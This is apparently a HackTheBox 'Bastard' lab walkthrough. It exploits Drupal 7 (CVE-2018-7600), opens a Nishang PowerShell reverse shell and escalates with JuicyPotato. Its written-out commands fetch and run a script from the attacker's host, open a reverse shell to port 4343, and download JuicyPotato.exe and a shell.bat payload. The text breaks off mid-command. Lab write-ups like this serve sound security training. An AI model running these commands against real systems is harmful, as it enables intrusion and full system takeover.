12:T2a57,<figure><img src="/writing/media/a90f661820c069c0928577b3.webp" alt="HackTheBox “Bastard” Walkthrough, figure 1" width="1200" height="909" loading="lazy" decoding="async" /></figure><p>In this walkthrough, we delve into the HackTheBox machine named “Bastard.” By exploiting the Drupal 7 vulnerability (CVE-2018–7600), we gain command execution. Afterwards, we establish a reverse shell and showcase the privilege escalation exploit known as SeImpersonatePrivilege (potato attack).</p><p>Let’s get started!🚀</p><h2 id="recon-and-enumeration">Recon &amp; Enumeration</h2><p>Let’s use nmap to scan for open ports and services:</p><figure><img src="/writing/media/3e2e2108d3bb8adeef4c1b42.webp" alt="HackTheBox “Bastard” Walkthrough, figure 2" width="947" height="694" loading="lazy" decoding="async" /></figure><p>We see the presence of Drupal 7. To determine the exact version, we can leverage the changelog file.</p><p>Let’s see what information the browser will display to us.</p><figure><img src="/writing/media/7c99df3fa6f9d5f63090a602.webp" alt="HackTheBox “Bastard” Walkthrough, figure 3" width="538" height="697" loading="lazy" decoding="async" /></figure><p>Furthermore, based on the page source code, we can confirm that it is Drupal 7.</p><figure><img src="/writing/media/fb3bafe1f41810cdaf9792d5.webp" alt="HackTheBox “Bastard” Walkthrough, figure 4" width="799" height="402" loading="lazy" decoding="async" /></figure><p>We will now conduct a searchsploit for known exploits targeting Drupal version 7.</p><figure><img src="/writing/media/881959cde27e66a7a6abaa52.webp" alt="HackTheBox “Bastard” Walkthrough, figure 5" width="937" height="762" loading="lazy" decoding="async" /></figure><p>To refine the results and discover a more suitable exploit, I will search on Google.</p><figure><img src="/writing/media/542a7c093317b6afac899ce3.webp" alt="HackTheBox “Bastard” Walkthrough, figure 6" width="748" height="890" loading="lazy" decoding="async" /></figure><p>Upon testing multiple listed exploits, I determined that the one by pimps was the most effective. You can find it <a href="https://github.com/pimps/CVE-2018-7600" rel="nofollow noopener noreferrer" target="_blank">here</a>.</p><p>I proceeded to copy the RAW script and saved it as “drupal.py.”</p><figure><img src="/writing/media/67b96e930cc24dfdbe6ffa4f.webp" alt="HackTheBox “Bastard” Walkthrough, figure 7" width="665" height="968" loading="lazy" decoding="async" /></figure><p>We download it to our attack box.</p><figure><img src="/writing/media/e20d0508d3989644237808b1.webp" alt="HackTheBox “Bastard” Walkthrough, figure 8" width="948" height="308" loading="lazy" decoding="async" /></figure><p>The script is straightforward. You only need to provide the command to execute and the target (website). It will exploit the service and provide the command’s output as a result.</p><figure><img src="/writing/media/61d748775b930eb27f46c5a1.webp" alt="HackTheBox “Bastard” Walkthrough, figure 9" width="656" height="211" loading="lazy" decoding="async" /></figure><p>I will now obtain a reverse shell on the target.</p><p>To achieve this, I will utilize the “Invoke-PowerShellTcp.ps1” script from Nishang Scripts, which can be found <a href="https://github.com/samratashok/nishang" rel="nofollow noopener noreferrer" target="_blank">here</a>.</p><p>After acquiring a copy of the script on my attacker machine, I placed it in my working directory and added the following command at the end:</p><pre><code data-language="text">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.8 -Port 4343</code></pre><figure><img src="/writing/media/5a7c170ec39d709f5bec34df.webp" alt="HackTheBox “Bastard” Walkthrough, figure 10" width="945" height="518" loading="lazy" decoding="async" /></figure><p>Next, we run an HTTP server within the working directory of our attack box.</p><figure><img src="/writing/media/561533fc00b0a1d17c1cfef6.webp" alt="HackTheBox “Bastard” Walkthrough, figure 11" width="505" height="83" loading="lazy" decoding="async" /></figure><p>We initiate a netcat listener on port 4343 to capture the incoming shell.</p><figure><img src="/writing/media/97067fa558bcffd509d0873d.webp" alt="HackTheBox “Bastard” Walkthrough, figure 12" width="245" height="94" loading="lazy" decoding="async" /></figure><p>We execute the command below to download and execute the script directly into memory:</p><pre><code data-language="text">python3 drupal.py -c "powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.8:8080/Invoke-PowerShellTcp.ps1')" http://10.10.10.9</code></pre><figure><img src="/writing/media/f58dd0a2e432909cafc9bcfb.webp" alt="HackTheBox “Bastard” Walkthrough, figure 13" width="943" height="266" loading="lazy" decoding="async" /></figure><p>The script file has been successfully downloaded from our attack box.</p><figure><img src="/writing/media/fa229d48fbcd9db4755b8a0a.webp" alt="HackTheBox “Bastard” Walkthrough, figure 14" width="701" height="92" loading="lazy" decoding="async" /></figure><p>Consequently, we establish a shell on our listener.</p><figure><img src="/writing/media/59d31a3e9c12afd0e6b3fcc4.webp" alt="HackTheBox “Bastard” Walkthrough, figure 15" width="512" height="200" loading="lazy" decoding="async" /></figure><p>After gaining a shell on the target box, I proceeded to conduct manual enumeration, commencing with gathering system information.</p><figure><img src="/writing/media/de196775441a620aaba6c355.webp" alt="HackTheBox “Bastard” Walkthrough, figure 16" width="769" height="684" loading="lazy" decoding="async" /></figure><p>The obtained information reveals valuable details. Firstly, the OS is Windows Server 2008 R2 without any installed hotfixes, indicating vulnerability to a kernel exploit. Moreover, it confirms that the host operates on a 64-bit system, which is pertinent when utilizing tools.</p><p>Subsequently, I proceeded to collect information about the current user’s privileges using the following command:</p><figure><img src="/writing/media/d931b82c2bc920c7a86a8e18.webp" alt="HackTheBox “Bastard” Walkthrough, figure 17" width="606" height="185" loading="lazy" decoding="async" /></figure><p>The finding of enabled SeImpersonatePrivilege implies that I can leverage a potato attack to escalate privileges to SYSTEM.</p><figure><img src="/writing/media/62e0bdc4c2e247f1471cbb7e.webp" alt="HackTheBox “Bastard” Walkthrough, figure 18" width="637" height="798" loading="lazy" decoding="async" /></figure><p>Obtain a copy of JuicyPotato.exe from this GitHub repository <a href="https://github.com/ohpe/juicy-potato/releases/tag/v0.1" rel="nofollow noopener noreferrer" target="_blank">here</a>, ensure to acquire the 64-bit version of the executable.</p><figure><img src="/writing/media/983ff80de8f10a4d0990b5ef.webp" alt="HackTheBox “Bastard” Walkthrough, figure 19" width="946" height="453" loading="lazy" decoding="async" /></figure><p>Meanwhile, our HTTP server in the working directory of our attacking box remains operational.</p><figure><img src="/writing/media/9338ae1a77452f3367fa8c9f.webp" alt="HackTheBox “Bastard” Walkthrough, figure 20" width="695" height="98" loading="lazy" decoding="async" /></figure><p>Create a temp directory within the C partition.</p><figure><img src="/writing/media/975c5fa4701345ffe71eb8e5.webp" alt="HackTheBox “Bastard” Walkthrough, figure 21" width="418" height="169" loading="lazy" decoding="async" /></figure><p>We proceed to download JuicyPotato onto the target machine.</p><pre><code data-language="text">(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.4:8080/JuicyPotato.exe', 'C:\temp\JuicyPotato.exe')</code></pre><figure><img src="/writing/media/80bef9de6f45323ba81d7d53.webp" alt="HackTheBox “Bastard” Walkthrough, figure 22" width="947" height="216" loading="lazy" decoding="async" /></figure><p>Let’s execute the exploit and see the outcome.</p><figure><img src="/writing/media/92e0088785e5f120c4ed7aad.webp" alt="HackTheBox “Bastard” Walkthrough, figure 23" width="733" height="300" loading="lazy" decoding="async" /></figure><p>In order to run the tool successfully, we require a port number for the COM server and a valid CLSID. There are two options: either use the provided list by the tool authors corresponding to the system version or execute the following PowerShell script to extract the CLSID of the current system:</p><p><a href="https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1" rel="nofollow noopener noreferrer" target="_blank">GetCLSID.ps1 script</a></p><p>I will use a batch script to download the Nishang PowerShell script. On the attacker machine, use the following command to craft a batch script:</p><pre><code data-language="text">echo "powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.5:8080/Invoke-PowerShellTcp.ps1')" &gt; shell.bat</code></pre><figure><img src="/writing/media/2a0b39021829603e5428c9de.webp" alt="HackTheBox “Bastard” Walkthrough, figure 24" width="928" height="68" loading="lazy" decoding="async" /></figure><p>Download the batch script onto the target box using the command below.</p><pre><code data-language="text">(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5:8080/shell.bat', 'C:\temp\shell.bat')</code></pre><figure><img src="/writing/media/2a02181f8dfb471d509a31fd.webp" alt="HackTheBox “Bastard” Walkthrough, figure 25" width="938" height="245" loading="lazy" decoding="async" /></figure><p>The setup is complete, and we are ready to proceed with the exploit. data-language="text">C:\temp\JuicyPotato.exe -l 4343 -p C:\temp\shell.bat -t * -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}"</code></pre><figure><img src="/writing/media/261fcbbbd880fbb1fc9f3cb6.webp"
